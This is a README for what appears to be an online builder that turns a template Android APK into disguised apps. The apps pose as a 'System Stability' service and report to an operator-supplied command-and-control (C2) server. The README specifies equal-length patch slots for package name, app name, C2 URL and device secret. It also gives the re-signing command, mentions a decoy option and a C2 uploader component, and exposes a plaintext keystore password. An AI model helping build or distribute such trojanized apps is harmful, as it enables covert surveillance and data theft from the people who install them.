# builder/ - online APK builder center: template + signing materials

This directory holds the template APK and signing materials for the online APK
builder (server side is implemented by c2-deploy in c2-server/server.js).

## Files

- template.apk (22,709,319 bytes): prebuilt signed APK with the three placeholder
  slots baked in. Built from build.ps1 with package com.stability.sync, app name
  "System Stability", C2 slot and device-secret slot (see below).
- builder-keystore.p12: PKCS12 signing keystore. Alias prodkey. Password
  Builder!Ks2026. Reference it ONLY via the BUILDER_KS_PASS environment variable
  in server code; never hardcode the password.
- apksigner.jar: copy of Android SDK build-tools 34.0.0 lib/apksigner.jar.

## Placeholder spec (fixed by lead, keep in sync with c2-deploy)

1. Package name: com.stability.sync (17 chars, ASCII only).
   Replacement MUST be equal length. Input validation: regex ^[a-z][a-z0-9.]{6,16}$
   and total length exactly 17.
2. App name: "System Stability" (16 chars). Replacement MUST be equal length.
   Input: <= 16 ASCII chars; pad RIGHT with spaces to 16.
3. C2 address slot: 96 chars total =
   "https://your-c2-host.example.com" (this URL string is 32 chars, NOT 31 as in
   the lead note; the lead note counts it as 31, the total stays 96) + 64 '#'.
   Input: any https URL of <= 95 chars; pad RIGHT with '#' to 96.
4. Device secret: 49ac647fd2dfe2549f5968df616de504 (32 hex chars).
   Replacement MUST be equal length (32 hex).

## Where the placeholders live (verified 2026-11-12)

- classes.dex (UTF-8): package x1, app name x4, C2 slot x1, secret x1.
  The app-name pattern also prefixes hardcoded "System Stability Service" strings
  in code; replacing all occurrences keeps every string equal-length and safe.
- resources.arsc: package name x1 (UTF-16LE), app name x1 (UTF-8).
- AndroidManifest.xml (binary XML) also contains the package name; the builder
  must patch it as well (not counted by the verification script).

Feasibility was proven by build/tools/verify-template.ps1: decompress ->
equal-length replace -> rebuild zip -> all entries readable. The rebuilt APK is
unsigned by design: the builder MUST zipalign + apksigner re-sign after patching.

## Re-sign command template (server side)

  java -jar apksigner.jar sign \
    --ks builder-keystore.p12 --ks-type PKCS12 \
    --ks-pass pass:$BUILDER_KS_PASS --ks-key-alias prodkey \
    --out final.apk patched.apk
  (zipalign -p -f 4 patched.apk aligned.apk before signing)

## Other values baked into the template

- ENCRYPTION_KEY: random value fixed at template build time (see
  build/dist/build-config-*.json for the recorded value).
- DECOY_CHOICE=1, PANEL_BIND_ADDRESS=127.0.0.1.
- Template signing certificate is template.jks (build/keystore) - placeholder only;
  the online builder re-signs with builder-keystore.p12 before delivery.

## App-side note

The app already sanitizes the C2 slot at runtime
(C2_Uploader.sanitizeC2Url strips all '#' and trailing '/'), so no extra handling
of the padding is needed on the device.
